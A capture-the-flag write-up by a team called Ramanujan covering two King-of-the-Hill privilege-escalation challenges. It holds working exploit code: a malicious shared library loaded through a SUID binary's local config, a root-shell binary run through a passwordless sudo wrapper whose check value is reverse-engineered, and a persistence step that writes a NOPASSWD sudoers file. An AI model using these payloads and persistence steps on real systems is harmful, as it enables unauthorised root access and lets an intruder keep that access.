# Ramanujan KoTH WriteUp

## Challenge 1:
```bash
find / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
```
```bash
-rwsr-xr-x 1 root root 16952 /usr/local/sbin/auditkit
```
We can see that in this for `auditkit`, `s` is there which is the owner permission, SO the process runs with Root's UID.

```bash
cat /etc/auditkit/auditkit.conf
```

Shows us that 
```text
module_dir = /usr/local/lib/auditkit/modules
module_name = basic.so
allow_local = yes
```

Now we create a Payload

```bash
cd /tmp
```
```bash
cat > 2.c <<'EOF'
#define _GNU_SOURCE
#include <unistd.h>

__attribute__((constructor))
static void root_init(void)
{
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF

gcc -shared -fPIC -o exploit.so 2.c

cat > .auditkit.conf <<'EOF'
module_dir=/tmp
module_name=exploit.so
EOF
```
```bash
/usr/local/sbin/auditkit -v
```

makes our id as
```
uid= (Root) gid= (Root) groups=1010(Ramanujan)
```

So we gain Root access.


Now we can modify `/root/king.txt`

BUT, Since other teams are also continously modifing the file, we loop it with sleep 0.5 sec.

```bash
while true; do
    cat /root/king.txt
    printf '%s\n' 'Ramanujan' > /root/king.txt
    cat /root/king.txt
    sleep 0.5
done
```

Here we are reading the file also to make sure If someone else has changed the file or are we the only ones accessing the file.


## Challenge 2:

```bash
sudo -l
```
Running this we get that we have sudo access without password for specific stuff

```bash
(root) NOPASSWD: /usr/local/bin/gate
```

So we can invoke a custom root executable without a password


```bash
ls -l /usr/local/bin/gate 
file /usr/local/bin/gate 
cat /usr/local/bin/gate
```
```text
-rwxr-xr-x 1 root root 14472 Sep 26 16:04 /usr/local/bin/gate

/usr/local/bin/gate: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, ... stripped
```

This tells us that `gate` is a 64-bit ELF owned by root

```bash
strings -a -tx /usr/local/bin/gate | grep -Ei 'usage|sudo|drop|regain|check|unlock|king|script|identifier|secret|hash|id'
```

This gives us 
```text
5cb setegid 
5f1 seteuid 
2008 usage: %s <script> <identifier> 
2030 gate: must be invoked via sudo
2050 SUDO_UID 
2059 SUDO_GID 
2062 drop 
2067 regain 
206e gate: check failed (code=%d)
208c /root/king.txt 
20a6 gate: unlocked
```

So the syntax of running is 

`gate <script> <identifier>` run with sudo, since we are given NOPASSWORD sudo we can run.


Now we create our payload

```bash
cd /tmp
```
```bash
cat > gate.c <<'EOF'
#define _GNU_SOURCE
#include <unistd.h>

int main(void)
{
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 1;
}
EOF
```
```bash
gcc -o gate-root gate.c
```

Then run it with 134
```bash
sudo /usr/local/bin/gate /tmp/gate-root 134
```

WHY 134 Calculation:

```bash
objdump -d -M intel --start-address=0x12e0 --stop-address=0x13e0 /usr/local/bin/gate
```

```text
12fa: c6 44 24 0d 4d    mov BYTE PTR [...],0x4d
12ff: c6 44 24 0e 2a    mov BYTE PTR [...],0x2a
1304: c6 44 24 0f 17    mov BYTE PTR [...],0x17

1309: movzx eax,...
130e: movzx ecx,...
1313: movzx edx,...

1318: xor eax,ecx
131a: xor edx,0x8

131d: movzx eax,al
1320: movzx edx,dl

1323: add eax,edx
1325: cmp ebp,eax
1327: jne ...
```

Clearly there are 3 hardcoded values i.e.  0x4d, 0x2a and 0x17


XORed the third value with: 0x08

So, 
```text
0x4d XOR 0x2a = 0x67 = 103
0x17 XOR 0x08 = 0x1f = 31
103 + 31 = 134
```

Now we are root:

So just doing this we can write out name in the flag

```bash
printf '%s\n' 'Ramanujan' > /root/king.txt
cat /root/king.txt
```

BUT.....

Other teams keep accessing the flag and changing it. So we loop it like the first challenge.

```bash
while true; do
    cat /root/king.txt
    printf '%s\n' 'Ramanujan' > /root/king.txt
    cat /root/king.txt
    sleep 0.5
done
```

Next idea was to change the file with `Ramanujan` and then remove Write access to the file so that other teams cant write it. (Permissions can be changed by root, but it gives us time till they figure it out).

```bash
chmod a-w /root/king.txt
```

This removes write permissions for root.

Now again, other teams figure it out and then loop it to unblock permission and write to file.

One of the opponent team found an amazing way to mount as a file system, so that we cannot change permission. We we first need to umount it.

```bash
umount /root/king.txt
```

Another opponent team found a way to continously change permission to `000` so that no one can RWX the file. So we delete the file and re-create the file with our data.

```bash
rm -rf /root/king.txt
```


FINAL PAYLOAD: to save the file
```bash
while true; do
    umount /root/king.txt
    rm -rf /root/king.txt
    cat /root/king.txt
    printf '%s\n' 'Ramanujan' > /root/king.txt
    cat /root/king.txt
    chmod a-w /root/king.txt
    sleep 0.5
done
```

Other teams try to kill your SSH process and block the path you have taken to get sudo access, As Root can do anything.

```bash
printf '%s\n' 'Ramanujan ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/Ramanujan
chmod 440 /etc/sudoers.d/Ramanujan
visudo -cf /etc/sudoers.d/Ramanujan
```


So we found a simple way by adding our user `Ramanujan` to root access. So if anyone kicks us out we just do

```bash
su root
```

and we are back as root.